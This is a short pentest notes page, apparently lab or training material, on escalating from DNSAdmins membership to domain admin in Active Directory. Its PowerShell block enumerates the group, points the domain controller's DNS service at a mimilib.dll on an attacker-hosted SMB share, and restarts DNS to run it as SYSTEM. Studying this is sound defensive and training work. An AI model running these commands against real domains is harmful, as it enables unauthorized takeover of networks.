---
title: "DNS Admins"
description: "Privilege escalation using DNS Admins."
lead: "Using DNS Admins for privilege escalation in Active Directory with PowerView and Mimikatz."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_privilege_escalation"
weight: 40
toc: true
---

## General

- Members of the DNS Admins group can load arbitrary DLL's with the privileges of dns.exe (SYSTEM)
- If the DC serves as DNS server, we can escalate to DA
- But: need to be able to restart the DNS on the DC

## Exploitation

- Can use mimilib.dll from mimikatz
- Modify kdns.c or use boiler plate from [here](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
- mimilib.dll logs all DNS queries to C:\Windows\System32\kiwidns.log by default
- Host DLL on SMB server with anonymous access
- Be careful, else DNS might fail -> noisy!

```powershell
# Enumerate members of DNSAdmins group
# Using PowerView 3.0
Get-DomainGroupMember "DNSAdmins"

# Using AD Module
Get-ADGroupMember -Identity "DNSAdmins"

# With privileges of DNSAdmins member, e.g. through PTH, configure DLL
# Using dnscmd.exe (needs RSAT DNS)
dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.72.100\dll\mimilib.dll

# Using DNSServer module (needds RSAT DNS)
$dnsettings = Get-DNSServerSetting -ComputerName dcorp-dc -Verbose -All
$dnsettings.ServerLevelPluginDll = "\\172.16.72.100\dll\mimilib.dll"
Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose

# Restart DNS service
sc \\dcorp-dc stop dns
sc \\dcorp-dc start dns
```
